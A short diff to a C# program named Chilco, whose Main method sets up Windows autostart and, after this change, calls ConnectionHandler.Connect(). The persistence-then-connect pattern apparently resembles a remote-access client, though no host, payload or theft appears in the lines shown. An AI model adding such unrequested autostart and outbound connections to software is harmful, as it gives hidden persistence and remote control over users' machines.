@@ -1,7 +1,6 @@
+using IWshRuntimeLibrary;
 using System;
 using System.IO;
-using Shell32;
-using IWshRuntimeLibrary;
 
 namespace Chilco
 {
@@ -14,6 +13,7 @@ namespace Chilco
         private static void Main()
         {
             ImplementAutostart();
+            ConnectionHandler.Connect();
         }
 
         public static void ImplementAutostart()
